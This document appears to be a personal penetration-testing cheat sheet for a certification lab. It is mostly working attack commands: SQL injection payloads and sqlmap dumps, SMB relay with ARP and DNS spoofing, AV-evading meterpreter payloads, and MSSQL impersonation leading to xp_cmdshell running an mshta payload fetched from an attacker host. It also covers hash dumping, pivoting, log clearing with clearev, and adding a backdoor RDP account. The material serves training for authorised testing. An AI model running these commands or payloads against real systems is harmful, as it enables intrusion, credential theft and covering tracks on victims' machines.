## OWASP ZAP - (SQLi & Spidering)

## SQLi

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

- Finding SQLi
    1. Do spidering
    2. Do Active Scan
    3. Send the login form request to the fuzzer
    4. Make the username as a space and make a fuzz location (Testing payload)
    5. Use the pre-Build sql payload (File Fuzzers→Jbrofuzz→SQLi→SelectAll) → Start Fuzzer
    6. if you get reflected=Error-Based SQLi is valid! (Some are false positives)
- Error-Based Exploitation
    - Error-Based SQLi Methodology
        1. Identify input an app input that doesn’t have any input validation and it interacts with app DB
        2. Inject malicious SQL code →Intruder or SQLmap
        3. Observe the error messages→ Observe length or in case sqlmap, keep ‘y’sing
        4. Extract data → Abuse it (SQLmap for data extraction, others for identifying)
        5. Exploiting → Abuse what you extracted
- Union-Based Exploitation
    - Union-Based SQLi Methodology
        1. Identify user input that interact with the app DB
        2. Test input for the vulns
            1. Notice errors or unexpected behavior 
        3. Identify vulnerable injection points 
            1. (`UNION SELECT`, or `‘OR ‘1’=’1’` .. etc.)
        4. Confirm the presence if a vulnerability 
            1. Try injection and notice the info disclosures
        5. Enumerate the DB structure 
            1. Inject UNION SELECT statements with appropriate column names and table names to retrieve info about DB schema, tables, and columns you can use like ORDER BY or LIMIT.
    - UNION Based Exploitation Example
        
        `‘ OR ‘1’ = ‘1’;—`
        
        `‘ OR ‘1’ = ‘1’ ORDER BY Rank ASC;—`
        
        `‘ OR ‘1’ = ‘1’ UNION SELECT 1,2,3,4,5;—`
        
        `' OR '1'='1' UNION SELECT 1,2,3,4,**tbl_name FROM sqlite_master**;—`
        
        `' OR '1'='1' UNION SELECT 1,2,3,4,**sql FROM sqlite_master**;—`
        
        `' OR '1'='1' UNION SELECT 1,2,3,4,value FROM secret_flag;—`
        
        ---
        
        `' OR '1'='1' UNION SELECT 1,2,3,4,sqlite_version();—`
        
        `sqlmap -r request.txt -p rollno --technique=U --dbms=SQLite --union-cols=5 --dump`
        

### SQLMap

- Suggested SQLMap approach:
    1. Default
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)"`
        
        1. If Post:
            
            `sqlmap -u "[http://example.com/login.php](http://example.com/login.php)" --data="username=admin&password=123" —method POST`
            
    2. Fast detection: 
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" --batch --level=1 --risk=1 --technique=BEUSTQ`
        
    3. Identify DBMS
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" --dbms=mysql --banner`
        
    4. Dump all
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" --dump-all --threads=10 --batch --answers="follow=Y"`
        
    5. Specific extraction or techniques
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" --dbs`
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" -D usersdb --tables`
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" -D usersdb -T users --columns` 
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" -D usersdb -T users -C username,password --dump`
        
        `sqlmap -u "[http://example.com/page.php?id=1](http://example.com/page.php?id=1)" --os-shell`
        
        `sqlmap -r request.txt -p words_exact --technique=E --answers="follow=Y" -D recipes -T sessions --columns` OR `--dump`
        
        - Union-Based
        
        `sqlmap -r request.txt -p rollno --technique=U --dbms=SQLite --union-cols=5 --dump`
        
    - Techniques:
        - **B** = Boolean-based blind
        - **E** = Error-based
        - **U** = Union query-based
        - **S** = Stacked queries
        - **T** = Time-based blind

### Nikto

```mathematica
nikto -h <http://ip>
# 
nikto -Help
# 
nikto -h <http://ip> -o nikto.html -Format htm

```

### Gobuster

```mathematica
gobuster dir -u <url> -w <wordlist>
# Excluding 
gobuster dir -u <url> -w <wordlist> -b 403,404,301
# Extensions
gobuster dir -u <url> -w <wordlist> -b 403,404,301 -x .php,.asp,.txt,.java,.html -r
# Specific
gobuster dir -u <url>/<path> -w <wordlist> -b 403,404,301 -x .php,.asp,.txt,.java,.html -r
```

- Wordlists:
    - common.txt

### Amass - Automating Web Enum

- Installation:
    
    ```bash
    sudo apt install amass
    ```
    
- Usage:
    
    ```bash
    amass intel # Discovery
    amass enum  # Network mapping
    amass viz   # Vizulaise for reporting 
    amass track # 
    amass db    # DB Manipulation
    ######
    amass enum -d <url>
    amass enum -d <url> -passive
    amass enum -d <url> -passive -src -ip -brute -dir <pathToSaveIn(Folder)>
    ####
    amass intel -d <url> -active -whois -dir <pathToSaveIn(Folder)>
    ## Reporting ##
    amass viz -dir <PathWhereitSaved(Folder)>
    
    ```
    

## WPScan

- For plugins and themes vuln scan; you need an API Token (75 Days free)

```bash
# Installation
sudo apt-get install wpscan
##
wpscan --url <url>
# Plugins enumeration
wpscan --url <url> --enumerate p --plugins-detection <aggressive, passive, or mixed>
# Vuln Scan (API Key)
wpscan --url <url> --enumerate p --plugins-detection <aggressive, passive, or mixed> --api-token <token>

```

- We may use exploit-db along with the vulns we find along
    - Always manual search for vulns found by wpscan, more accurate.
        - Version of theme, plugin, or WordPress version

## MyBBScan

```bash
git clone <MyBBScanReooi>
python3 scan.py
# Then Enter the url without any path
```

# Network PT

### Netstat

```bash
# List active TCP conneciton
netstat -antp
```

### Host Discovery

```bash
# Number of packets of ICMP using ping:
# Windows
ping -n 5 <>
# Linux
ping -c 5 <>
# Host Discovery with "fping"
fping -a -g 10.1.0.0/24 2>/dev/null
```

### Nmap

- Methods:
    
    ```bash
    ***"Host Discovery ‘-sn’"***
    # Ping Sweep (Not recomended with Windwos)
    nmap -sn 192.168.1.0/24
    ## If internally, it will be ARP.. do make it ping
    nmap -sn 192.168.1.0/24 --send-ip
    ###!!!!Proffisional Host Discovery!!!!###
    # ARP 
    sudo nmap -sn -PR 192.168.1.0/24
    # SYN
    sudo nmap -sn -PS1-1000 192.168.1.0/24
    # ACK
    sudo nmap -sn -PA1-1000 192.168.1.0/24
    # UDP
    sudo nmap -sn -PU1-1000 192.168.1.0/24
    # Combination
    sudo nmap -sn -PS1-1000 -PA1-1000 -PU53,67,123 -PR 192.168.1.0/24
    # Stealthy
    sudo nmap -sn -PS1-1000 -PA1-1000 --scan-delay 500ms --max-retries 1 -T2
    ####
    # ICMP Specific Scan (Not recommended), --send-ip only if it's internal scan
    sudo nmap -sn -PE 192.168.1.0/24 --send-ip
    ####
    # -Pn -> Don't ping
    # -sn -> Don't portscan
    # -n -> Save time
    ***"PortScanning ‘-Pn’"***
    # More accuracy need in PortScanning or OS, service fingerPrint? use **-sT**
     nmap -sU -Pn -n -p- -sV --min-rate=10000 --max-retries=3 -T4 --open demo.ine.local
     nmap -sS -Pn -n -p- -sV --min-rate=10000 --max-retries=3 -T4 --open demo.ine.local
    ## You may remove "-sV" to save time and make the service enum with specifed ports!
    ***"FingerPrinting‘-O, --osscan-guess & -sV, --version-intensity’"***
    nmap -O --osscan-guess
    "--osscan-guess, Highly recommeended if -O didn't get any results"
    "--version-intensity <1-8>"
    ***"Scripts (NSE)‘-sC’"***
    -sC => Default
    --script=</usr/share/nmap/scripts>
    --script= <Scripts>,..etc --script-args #**--script-args= For usernames, passwords..etc
    --script-help**= <script>
    ***"Firewall/IDS Evasion ‘-f, --ttl, --data-length, -D, -G, -T<>’"***
    # Detecting firewall done with '-sA' 
    nmap -Pn -sS -sV -F -f => # -f - Fragmenting packets, you may add '--mtu' 
    ## MTU-> Maximum Transmitted Unit.
    nmap -Pn -sS -sV -F -D <spf.ip>,<other.ip>..etc => # -D - Spoofing src.ip
    nmap -Pn -sS -sV -F --ttl => # Specify Time To Live
    nmap -Pn -sS -sV -F --data-length <lenght> => # Specify Data length
    nmap -Pn -sS -sV -F -G <spf.Port> => # Spoofing src.port
    nmap -Pn -sS -sV -F -T1 # -T1 => Make you scan sneaky and less susspcious
    ***"ScanOptimization(StealthyPurposes)‘-T, host-timeout & --scan-delay’"***
    nmap -Pn -sS -sV -F -T<0->5> # -T => Specify how fast the scan 
    nmap --host-timeout # --host-timeout => The time that it will give up on the target
    ******## --host-timeout recomended to be.. '--> 30s <--'
    nmap -Pn -sS --scan-delay # --scan-delay => Specifiy Delay between packets sent
    ***"Output & Verbosity ‘-oN,X,G,A & -v & --open’"***
    nmap -oG => # Grepable format (Great for specific visibility)
    nmap -oN => # Normal format output
    nmap -oX => # .xml-xml format is compatible with metasploit-framework for db_import
    nmap -oA => # All formats
    nmap --open # Get only open ports
    ### db_nmap for further scans within metasploit-framework.
    nmap -v =>  # For understanding and debugging (Increase verbosity level)
    ```
    
    1. Ping Sweeps
        1. ICMP Requests
        2. Some firewalls/IDS block ICMP! Like Windows
        3. Quick method
    2. ARP Scanning (-PR)
        1. ARP Request
        2. Works **locally** only!
    3. TCP SYN Ping (-PS -p <Any>)
        1. SYN Flag sending to specific port
        2. Responds with SYN-ACK
        3. Stealthier than ICMP and may bypass firewalls that allow outbounds
        4. But it has high false positives possibilities (Closed port or Host doesn’t responds to SYN)
    4. UDP Ping (-PU)
        1. Effective with hosts doesn’t responds to ICMP or TCP **Probes**
    5. TCP ACK Ping (-PA)
        1. SYN Flag sending to specific port
        2. Responds with RST
    6. SYN-ACK Ping
        1. SYN-ACK Flag sending to specific port
        2. Responds with RST
- msfconsole x nmap
    
    ```bash
    hosts
    workspace -a 
    services
    ```
    

## Windows Enumeration

### SMB & NetBIOS Enumeration

- nbtscan
- smbclien
    
    ```bash
    smbclient -L //demo.ine.local/C$ -N                                                                                                                                                               
    # Anon login and share listing and content harvesting
    smbclient //demo.ine.local/<Share> -U administrator%password1     
    ```
    
- smbmap
    
    ```bash
    smbmap -u administrator -p password1 -H demo.ine.local
    # Share listing and uploading and command executing and conte
    ```
    
- rpcclient
    
    ```bash
    rpcclient demo.ine.local -U WORKGROUP/administrator%password1
    rpcclient $> enumdomusers
    rpcclient $> enumdomains  
    ```
    
- enum4linux
    
    ```bash
    enum4linux-ng -A -u administrator -p password1 -w ATTACKDEFENSE 10.6.24.118                                                                                                                                                                            
    # Groups, users policies, versions, OS, shares
    ```
    
- metasploit
    
    ```bash
      #  Name                                        Disclosure Date  Rank    Check  Description
       -  ----                                        ---------------  ----    -----  -----------
       0  auxiliary/scanner/smb/smb_enumusers_domain  .                normal  No     SMB Domain User Enumeration
       1  auxiliary/scanner/smb/smb_enum_gpp          .                normal  No     SMB Group Policy Preference Saved Passwords Enumeration
       2  auxiliary/scanner/smb/smb_enumshares        .                normal  No     SMB Share Enumeration
       3  auxiliary/scanner/smb/smb_enumusers         .                normal  No     SMB User Enumeration (SAM EnumUsers)
    ```
    
- smbexec
    
    ```vbnet
    python3 smbexec.py ATTACKDEFENSE/administrator:password1@demo.ine.local
    ```
    
- psexec
    
    ```vbnet
    python3 psexec.py ATTACKDEFENSE/administrator:password1@demo.ine.local
    ```
    
- nmblookup
    
    ```bash
    nmblookup -A 10.6.24.118  
    Looking up status of 10.6.24.118
    No reply from 10.6.24.118
    ```
    
- nmap
    
    ```bash
    nmap -sS -T4 -n -sV -p445,139,135,138 demo.ine.local --script=smb* --script-args "smbuser=administrator,smbpass=password1"                                                                                                                             
    # And many many info regarding configurations, OS, versions, services,
    # **users**,polcies and groups
    ```
    
- Hydra
- Share Mapping:
    
    ```bash
    C:\Windows\system32>net view <Another target, Pivoted/ing> # to see mutual shares
    # Shares listing
    C:\Windows\system32>net use <Share>: \\10.6.17.191\<Share>
    # Use
    C:\Windows\system32>dir <Share>:
    # Dir
    ```
    

### SNMP Enumeration-Port(UDP→161 Queries & 162 Notification)

- System Data, Test community strings, Retrieve Network configuration, Users, Group information,  and their accesses, and services and application running on the target.
- nmap
    
    ```bash
    nmap -p161 -sV -Pn -sU -n -T4 10.6.23.201
    ##
    nmap -p161,162 -sU -T4 -n -Pn 10.6.23.201 --script=snmp* 
    # Processes & Services
    # Software
    # netstat output
    # snmp brute-Community Strings
    # interfaces
    **# users enumeration**	
    ```
    
- snmpwalk
    
    ```bash
    snmpwalk -v<version(1,2c)> -c <creds(CommunityString)> 10.6.23.201 | less
    ```
    
- metasploit
    
    ```bash
       50  auxiliary/scanner/snmp/snmp_login                                  .                normal     No     SNMP Community Login Scanner
       # Creds with its access level (Read/Write)
       51  auxiliary/scanner/snmp/snmp_enum                                   .                normal     No     SNMP Enumeration Module
       # Users, interfaces, processes, software...etc with better **Visaulizaiton**
       52  auxiliary/scanner/snmp/snmp_set                                    .                normal     No     SNMP Set Module
       53  auxiliary/scanner/snmp/snmp_enumshares                             .                normal     No     SNMP Windows SMB Share Enumeration
       54  auxiliary/scanner/snmp/snmp_enumusers  
       # Get users - For further exploit, like brute-force
       
    ```
    

## Linux Enumeration

- smtp (Simple Mail Transfer Protocol)
    
    ```bash
    # Nmap
    --script=smtp*
    # Metasploit
    msf6 auxiliary(scanner/smtp/smtp_version) > 
    msf6 auxiliary(scanner/smtp/smtp_enum) > 
    ### 
    # smtp-user-enum tool -> Can be also found in msfconsole 
    # -M <Methods> <- Which can be found in nmap
    smtp-user-enum -M VRFY -U */common_users.txt -t demo.ine.local
    ```
    
- samba
    
    ```bash
    # Nmap Enum
    nmap -p139,445,137 -sU -sV -sS -T4 -n demo2.ine.local --script=smb*
    # Got shares and secret flag under share called public in secret\flag
    # Users, shares, groups, vulneruble to smb-vuln-regsvc-dos, got the pass policy
    
    # Hydra -> 
    hydra -L ....* 
     
    # Metasploit-> There are plenty and can browse shares
    
    # rpcclient
    rpcclient -U "admin%password" 192.244.115.4
    rpcclient $> enumdomusers 
    rpcclient $> enumdomgroups 
    rpcclient $> queryuser <user> 
    
    # enum4linux-ng
    enum4linux-ng 192.244.115.4 -u admin -p 'password'                                                                                                                                                                                                     
     # Many many valuable things!!!!!.. Users,groups,rid's, shares...etc EVERYTHING
     
     
    # **smbmap** 
    	# YOU CAN DO MOSTLY THE SAME WITH smbclient
    smbmap -u admin -p password -H demo2.ine.local  
    # Shares info and its permissions and comments                                                                                                                                                                                                      
    # List shares and permissions
    smbmap -H 10.10.10.5
    
    # Connect with credentials
    smbmap -H 10.10.10.5 -u administrator -p 'Password123' -d DOMAIN
    
    # List files in a specific share
    smbmap -H 10.10.10.5 -u administrator -p 'Password123' -r ShareName
    
    # Download a file
    smbmap -H 10.10.10.5 -u administrator -p 'Password123' --download 'ShareName\file.txt'
    
    # Upload a file
    smbmap -H 10.10.10.5 -u administrator -p 'Password123' --upload localfile.txt 'ShareName\remote.txt'
    
    ```
    
- ftp
    
    ```bash
    # Nmap Enum
    PORT   STATE SERVICE VERSION
    79/tcp open  finger  Linux fingerd
    |_finger: No one logged on.\x0D
    # Get users via msfconsole module 
    msf6 auxiliary(scanner/finger/finger_users) > run
    # Then you can enumerate each user
    finger admin@192.94.75.5
    # OR with perl language tool "finger-user-enum.pl"
    ./finger-user-enum.pl -U */unix_users.txt -t demo3.ine.local
    ```
    
- finger
    
    ```bash
    # Nmap Enum
    --script=ftp*
    --script=proftp*
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     ProFTPD 1.3.3c
    | ftp-proftpd-backdoor: 
    |   This installation has been backdoored.
    |   Command: id
    |_  Results: uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
    | ftp-brute: 
    |   Accounts: No valid accounts found
    |_  Statistics: Performed 9408 guesses in 300 seconds, average tps: 31.4
    # OR
    nmap -sV -sS -Pn -T4 -n demo4.ine.local --script=vuln
    
    #####Exploit
    msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload 4
    msf6 exploit(unix/ftp/proftpd_133c_backdoor) > run
    ```
    

## Windows Exploitation

### Windows Exploitation AV Evasion

- veil x upx
    
    ```bash
    veil
    veil>: use 1
    Veil/Evasion>: use 28
    [python/meterpreter/rev_tcp>>]: set LHOST 172.16.5.101
    [python/meterpreter/rev_tcp>>]: set LPORT 4040
    [python/meterpreter/rev_tcp>>]: generate 
    # Paylaod Name
     [>] Please enter the number of your choice: 1
     [*] Language: python
     [*] Payload Module: python/meterpreter/rev_tcp
     [*] Executable written to: /var/lib/veil/output/compiled/payload1.exe
     [*] Source code written to: /var/lib/veil/output/source/payload1.py
     [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload1.rc
     
     
    upx --best --ultra-brute -f /var/lib/veil/output/compiled/payload1.exe -o test.exe                                                                                                              1 ⨯
    
    # Donwload with browser dont use certutil ! 
    ```
    

## SMB Relay Attack (Heavy use with LDAP in AD)

```bash
msf6 exploit(windows/smb/smb_relay) > set lhost 172.16.5.101 # <-Attacker
msf6 exploit(windows/smb/smb_relay) > set SRVHOST 172.16.5.101 # <-Attacker
msf6 exploit(windows/smb/smb_relay) > set SMBHOST 172.16.5.10
msf6 exploit(windows/smb/smb_relay) > run 
# 172.16.5.10  <- The one we will get a shell on (Client SystemIP)
# Spoofing step (Traffic posioning):
echo "172.16.5.101 *sportsfoo.com" > dns
dnsspoof -i eth1 -f dns
## In another terminal
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1 #يخدع الجهاز 172.16.5.5 (الضحية اللي يرسل طلبات) ويقول له أنا الراوتر 
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5 #يخدع الراوتر ويقول له أنا 172.16.5.5
# 172.16.5.5 -> is the target whoose keep sending and we want to intercept it
#####
msf6 exploit(windows/smb/smb_relay) >
**
[*] Meterpreter session 1 opened (172.16.5.101:4444 -> 172.16.5.10:49158) at 2022-01-21 19:30:17 -0500
## OR
msf6 auxiliary(server/capture/smb) > set srvhost eth1

##### Other Way Without Metasploit...
responder -I eth1 -wrf
WebDAV] NTLMv2 Client   : 172.16.5.5
[WebDAV] NTLMv2 Username : domain\aline
[WebDAV] NTLMv2 Hash     : aline::domain:44e922c8d6f9ff42:F9CBFC0BC63EE914604D262BE94EAB99:0101000000000000EC0168D4280FD8015C428EC9540137B00000000002000800490030005500510001001E00570049004E002D004F0053004F00490035004E00370050003400300058000400140049003000550051002E004C004F00430041004C0003003400570049004E002D004F0053004F00490035004E00370050003400300058002E0049003000550051002E004C004F00430041004C000500140049003000550051002E004C004F00430041004C000800300030000000000000000100000000200000CE0E3CF4BB9FA2899D3BD4FD6F1E51406393CB6BE5FD6915D615B63C3BA474200A0010000000000000000000000000000000000009003A0048005400540050002F00660069006C0065007300650072007600650072002E00730070006F0072007400730066006F006F002E0063006F006D000000000000000000 
```

## MSSQL DB Attacks

- User Impersonation to RCE
    
    ```bash
    impacket-mssqlclient bob:KhyUuxwp7Mcxo7@demo.ine.local
    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
    
    **
    [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
    [!] Press help for extra shell commands
    SQL (bob  guest@master)> 
    # Enuumeration
    ## Versions
    SQL (bob  guest@msdb)> select @@version;
    ## What users in sysadmin groups? are we in?
    SQL (bob  guest@msdb)> select loginname from syslogins where sysadmin = 1;
    ## Can we execute cmd commands functionality?
    SQL (bob  guest@msdb)> enable_xp_cmdshell
    ## mssql exploitation query
    **SQL (bob  guest@msdb)> select distinct b.name from sys.server_permissions a INNER JOIN sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE'; 
    name**     
    ------   
    sa       
    
    dbuser 
    ## Now we can impersonate sa and dbuser
    SQL (bob  guest@msdb)> execute as login = 'sa'
    ERROR: Line 1: Cannot execute as the server principal because the principal "sa" does not exist, this type of principal cannot be impersonated, or you do not have permission.
    SQL (bob  guest@msdb)> execute as login = 'dbuser'
    SQL (dbuser  guest@msdb)> execute as login = 'sa'
    # To know who you are currently.. "Type '**select system_user**'"
    # Now you may enable RCE
    SQL (bob  guest@msdb)> enable_xp_cmdshell
    SQL (sa  dbo@msdb)> exec xp_cmdshell "whoami"
    # Now you may upload a malacious payload and execute it (Quick hta payload would be good)
    msf6 > use exploit/windows/misc/hta_server
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/misc/hta_server) > run
    [*] Exploit running as background job 0.
    [*] Exploit completed, but no session was created.
    
    [*] Started reverse TCP handler on 10.10.45.5:4444 
    [*] Using URL: http://10.10.45.5:8080/nmr2QHMBx.hta
    
    SQL (sa  dbo@msdb)> exec xp_cmdshell "mshta http://10.10.45.5:8080/nmr2QHMBx.hta"
    
    msf6 exploit(windows/misc/hta_server) > [*] Server started.
    [*] 10.6.23.48       hta_server - Delivering Payload
    [*] Sending stage (176198 bytes) to 10.6.23.48
    [*] Meterpreter session 1 opened (10.10.45.5:4444 -> 10.6.23.48:51017) at 2025-08-10 04:15:33 +0530
    
    ```
    
- Payload Execution
    - windows/mssql/mssql_payload
        - needs only the password and the username and it will try to get you a meterpreter session
- Brute-Force
    - mssql_login

## Linux Exploitation

- cgi-bin (Shellshock)
    
    ```bash
    msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > 
    ```
    
- egallery
    
    ```bash
    msf6 exploit(unix/webapp/egallery_upload_exec) > 
    ```
    

## Linux-Post Exploitation

- exim (LocalPraaaaaaaaaaaaaaaaaaaaivilegeEscalation)
    
    ```bash
    msf6 exploit(linux/local/exim4_deliver_message_priv_esc) > 
    ```
    

## Windows-Post Exploitation

- Hash Cracking
    
    ```bash
    Server username: NT AUTHORITY\\SYSTEM
    meterpreter > hashdump
    # OR with mimikatz
    
    john --format=NT hashes.txt --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    # OR
    msf6 auxiliary(analyze/crack_windows) > run
    msf6 auxiliary(analyze/crack_windows) > creds
    ```
    
- Local Enumeration
    - Why **enum_application** and **enum_services** are important? Because they **mostly have creds!** which may give you access to the pivot machine
    
    ```bash
    msf6 exploit(windows/http/rejetto_hfs_exec) > search type:post platform:windows enum
    # or with JAWS enum
    # **post(windows/gather/enum_applications)
    #** post(multi/gather/***filezilla***_client_cred) >
    ```
    
- Pivoting
    - **255.255.0.0 → /16**
    - **255.255.240.0 → /20**
    - **255.255.255.0 → /24**
    - use -sT along with proxychains when using nmap
    
    ```bash
    meterpreter > run autoroute -s <PivotToIP>/20,24,or 16
    # 10.6.19.75 => demo1.ine.local
    msf6 auxiliary(scanner/portscan/tcp) > set rhosts <PivotToIP>
    msf6 auxiliary(scanner/portscan/tcp) > run
    meterpreter > portfwd add -l <localPort> -p <remotePort> -r <PivotToIP> 
    ####
    # Or with Prodxy chains with socks by changing version and SRVPORT
    ```
    
- Clear Tracks
    
    ```bash
    meterpreter > clearev 
    ```
    
- Upgrading shells when “session -u id” not working
    - post/multi/manage/shell_to_meterpreter
    - OR transfer an msfvenom payload
    
    ```bash
    msf6 auxiliary(scanner/ssh/ssh_login) > use post/multi/manage/shell_to_meterpreter
    msf6 post(multi/manage/shell_to_meterpreter) > set payload_override windows/x64/meterpreter/bind_tcp 
    payload_override => windows/x64/meterpreter/bind_tcp
    msf6 post(multi/manage/shell_to_meterpreter) > set platform_override windows
    platform_override => windows
    msf6 post(multi/manage/shell_to_meterpreter) > set psh_arch_override x64
    psh_arch_override => x64
    msf6 post(multi/manage/shell_to_meterpreter) > set session 3
    session => 3
    msf6 post(multi/manage/shell_to_meterpreter) > run
    **
    [*] Meterpreter session 4 opened (10.6.30.205:8280 -> 10.6.21.217:4433 via session 1) at 2025-08-10 19:11:50 +0530
    ```
    
- RDP
    - BY GENERAL.. RDP IS A TREASURE IN POST EXPLOITATION
    
    ```bash
    nmap -p3389 -sV -T4 -Pn -n demo.ine.local                                                                                                                                                                                                                  
    3389/tcp open  ssl/ms-wbt-server?   
    
    ###
    C:\Windows\system32>net user guest1 StrongP@ssw0rd /add 
    C:\Windows\system32>net localgroup "Remote Desktop Users" guest1 /add
    xfreerdp /u:guest1 /p:StrongP@ssw0rd /v:demo.ine.local
    
    ```
    

# System Security & Assembly

- Prologue
    - Prepares the Stack to be used
- Epilogue
    - Resets the stack to the prologue settings

## Brief about Assembly

- GPR (General Purpose Registers) → Ties to exploiting and etc..
    - Store data during program execution
    - Store like (integers, memory addresses, or intermediate results of ALU operation)
    - E* → 32-Bit Architecture
        
        ![image.png](eCPPT-CheatSheet%2020164f6a487d80b4be37fd2315287b6e/image%201.png)
        
        - **EAX, EBX, ECX, EDX:** ALU and data manipulation
            - **EAX(Accumulator)**: ALU operation, Store and load results, Holds function return values
            - **EBX(Base):** Base address for memory operations
            - **ECX(Counter):** Iteration counting, used with LOOP instruction
            - **EDX(Data):** Used with EAX, Used for 64-bit multiplication and division, its a GPR
        - **ESI, EDI:** String manipulation
            - **ESI(Source Index):** (String), Copying, Comparing, Searching strings
            - **EDI(Destination Index):** Holds starting address of the destination or the destination string during operations like copying or concatenation
        - **ESP, EBP:** Managing the stack
            - **ESP(Stack Pointer):** Points the top of the stack
            - EBP**(Base Pointer):** Used with ESP, Access parameters and local variables within function calls, Serves as a reference point for accessing data stored on the stack
        - **Instruction Pointer (EIP)**
            - Controls the program execution by storing a pointer to the address of the next instruction will be executed.
    - R* → 64-Bit Architecture
        - **RAX, RBX, RCX, RDX .. etc.:**

## Setting Up The Lab

- VM → [https://releases.ubuntu.com/16.04/ubuntu-16.04.6-desktop-i386.iso](https://releases.ubuntu.com/16.04/ubuntu-16.04.6-desktop-i386.iso)

```bash
sudo apt-get update && sudo apt-get install nasm build-essential -y

##
sudo apt install vim -y
vim ~/.vimrc 
	# set number
	# syntax on
```

- Commands:
    - lscpu to view ISA information
    - free -h for RAM information

[https://syscalls.w3challs.com/?arch=x86_64](https://syscalls.w3challs.com/?arch=x86_64)

- Hello World using Assembly - 32-bit
    
    ```nasm
    ; Hello world Program in ASM ; <- Comments
    ; Author: Shady
    
    section .data ;<- Data declaration
    	hello db 'Hello, World!',0xA	; Null terminated string
    
    section .text ; <- Contains the executable code of the program
    	global _start ; <- Provide entry point for the binary
    
    _start: ; <- Entry Point label, where it begins
    	mov eax, 0x4	; Move system call number for sys_write to eax
    	mov ebx, 0x1	; File descriptor 1 (stdout)
    	mov ecx, hello	; Pointer of the string
    	mov edx, 13	; Length of the string
    	int 0x80 	; Call kernel
    
    	; Gracefully Exit
    	mov eax, 0x1 	; System call number for sys_exit
    	xor ebx, ebx	; Retrun status 0
    	int 0x80 	; Call kernel
    
    ```
    
    .asm → .o (Object) → executable (elf or exe)
    
    ```bash
    vim helloWorld.asm
    # Afte finish writing
    nasm -f elf32 -o hello_world.o helloWorld.asm
    ld -m elf_i386 -o hello_world hello_world.o
    ./hello_world # ELF
    ```
    
- DataTypes
    
    ```nasm
    section .text
    	global _start
    _start:
    	xor eax, eax 	; Set eax to zero
    	mov eax, 0x41 	; Move letter 'A' to eax
    	mov [val], eax	; move letter 'A' to variable 'val'
    	
    	xor eax, eax	; set eax to zero
    	mov eax, 0x01
    	int 0x80	; Termination
    
    section .bss
    
    ```
    
    ```bash
    nasm -f elf varaibles.asm
    ld -m elf_i386 -o variables varaibles.o
    ```
    
    - Debugging Using **gdp**:
        
        ```bash
        vera@vera-VirtualBox:~/asmbly/DataTypes$ **gdb -q variables**
        Reading symbols from variables...(no debugging symbols found)...done.
        (gdb) set disassembly intel
        (gdb) set pagination off
        (gdb) info functions
        All defined functions:
        
        Non-debugging symbols:
        0x08048080  _start
        (gdb) disassemble _start
        Dump of assembler code for function _start:
           0x08048080 <+0>:	xor    eax,eax
           0x08048082 <+2>:	mov    eax,0x41
           0x08048087 <+7>:	mov    ds:0x8049098,eax
           0x0804808c <+12>:	xor    eax,eax
           0x0804808e <+14>:	mov    eax,0x1
           0x08048093 <+19>:	int    0x80
        End of assembler dump.
        (gdb) br *_start + 14
        Breakpoint 1 at 0x804808e
        (gdb) r
        Starting program: /home/vera/asmbly/DataTypes/variables 
        
        Breakpoint 1, 0x0804808e in _start ()
        (gdb) x/s
        Argument required (starting display address).
        (gdb) x/s &val
        0x8049098:	"A"
        
        ```
        

### Fuzzer with **Spike**

```bash
# TRUN.spk
s_readline();
s_string("TRUN ");
s_string_variable("COMMAND");

```

```bash
generic_send_tcp 172.16.5.120 9999 TRUN.spk 0 0
# Sucessfully crashed
```

- To debug you have many debuggers (e.g. Immunity Debugger)

### Windows Buffer Overflow

```
- Windows Stack Buffer Overflow
- How?
    1. Stack Memory Layout:
        1. Stack grows downward (Highest in bottom and Lowest at the top)
    2. Buffer Overflow
        1. Buffer here is located IN THE STACK!
        2. Buffer overflow can occur due to insufficient bounds checking or improper handling of user input
    3. Overwriting Return Address (EIP is Pushed)
        1. Overwriting EIP with a malicious one
    4. Control Hijacking
        1. EIP between your hands
        2. Control flow to execute a code of the attacker’s choice
    5. Exploitation
        1. Gaining unauthorized access, or utilizing other attacks (Backdoors, Reverse Shells)

---

- Defense Mechanism → Data Execution Prevention (DEP).
```

```
- Windows SEH Overflows
    1. Identification
        1. Vuln that allow to overwrite SEH exception Handler record
        2. Due insufficient bonds checking or improper exception handling
    2. Record Overwrite
        1. Overwrite SEH record with an malicious address to their shellcode or payload
    3. Exception Triggering 
        1. Triggering an exception
    4. Exception Handling
        1. Windows Kernel encounters the overwritten SEH Record
    5. Code Execution
        1. Payload Executed 
            1. PrivEsc, RCE, RevShell..etc..
```

- To identify the pattern to figure up the offset structure (In Immunity Debugger)
    
    shift+F7
    
    ```
    !mona pattern_create 717
    ```
    
    - Then you can take the pattern and put it in buffer= ”pattern” within the exploit
- Develop a shellcode using msfvenom:
    
    ```
    msfvenom -p windows/exec cmd=calc.exe exitfunc=thread -b "\x00\\x25\x2b" -f c
    ```
    

# Privilege Escalation

```powershell
# Get an elevated CMD Session
runas.exe /user:Administrator cmd.exe # -> cmd.exe (Can be a command or a payload)
# Get an elevated CMD Session with the **saved creds** in Windows Creds manager
